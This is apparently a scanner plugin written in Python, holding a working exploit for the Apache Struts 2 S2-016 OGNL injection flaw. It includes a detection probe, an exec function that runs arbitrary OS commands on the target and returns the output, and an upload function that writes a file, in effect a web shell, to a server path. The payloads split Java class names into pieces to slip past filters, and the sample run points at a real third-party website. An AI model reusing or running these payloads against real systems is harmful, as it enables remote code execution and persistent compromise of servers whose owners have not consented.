#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

def info(data=None):
    info = {
        "name": "Struts 2-016",
        "info": "Struts 2-016.",
        "level": "high",
        "type": "rec",
    }
    return info


def prove(data):
    data = init(data, 'struts')
    if data['url'] != None:
        try:
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            prove_poc = "redirect%3a%24%7b%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23resp.getWriter().print(%22struts2_se%22%2b%22curity_vul%22)%2c%23resp.getWriter().print(%22struts2_security_vul_str2016%22)%2c%23resp.getWriter().flush()%2c%23resp.getWriter().close()%7d"
            poc_key = '''struts2_security_vul'''
            res = curl('get',data['url'], data=prove_poc,headers = headers)
            if res and res.text.find(poc_key) != -1 or poc_key in res.headers :
                data['flag'] = 1
                data['data'].append({"poc": prove_poc})
                data['res'].append({"info": data['url'], "key": "struts2_016"})
        except:
            pass
    return data

def exec(data):
    data = init(data, 'struts')
    if data['url'] != None:
        cmd = data['cmd'] if 'cmd' in data.keys() else  'whoami'
        prove_poc = "redirect%3a%24%7b%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23s%3dnew+java.util.Scanner((new+java.lang.ProcessBuilder(%27%COMMAND%%27.toString().split(%27%5c%5c%5c%5cs%27))).start().getInputStream()).useDelimiter(%27%5c%5c%5c%5cAAAA%27)%2c%23str%3d%23s.hasNext()%3f%23s.next()%3a%27%27%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23resp.getWriter().println(%23str)%2c%23resp.getWriter().flush()%2c%23resp.getWriter().close()%7d".replace("%COMMAND%",cmd)
        try:
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            content = curl('get', data['url'], data=prove_poc, headers=headers).text
            data['flag'] = 1
            data['data'].append({"headers": data['headers']})
            data['res'].append({"info": content,"key":cmd})
        except:
            pass
    return data


def upload(data):
    data = init(data, 'struts')
    if data['url'] != None:
        if 'srcpath' not in data.keys() :
            raise Exception("None srcpath ")
        if 'despath' not in data.keys() :
            raise Exception("None despath ")
        despath = data['despath']
        content = _read_file(data['srcpath'])
        prove_poc = "redirect%3a%24%7b%23req%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27)%2c%23res%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27)%2c%23res.getWriter().print(%22oko%22)%2c%23res.getWriter().print(%22kok%2f%22)%2c%23res.getWriter().print(%23req.getContextPath())%2c%23res.getWriter().flush()%2c%23res.getWriter().close()%2cnew+java.io.BufferedWriter(new+java.io.FileWriter(%22%PATH%%22)).append(%23req.getParameter(%22shell%22)).close()%7d&shell=%FILECONTENT%".replace("%PATH%", despath).replace("%FILECONTENT%", content)
        try:
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            curl('get', data['url'], data=prove_poc, headers=headers)
            data['flag'] = 1
            data['data'].append({"poc": prove_poc})
            data['res'].append({"info": data['despath'],"key":"upload"})
        except:
            pass
    return data

def _read_file(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()


if __name__ == '__main__':
    from script import init, curl
    print(prove({'url': 'http://www.baidu.com', 'flag': -1, 'data': [], 'res': []}))
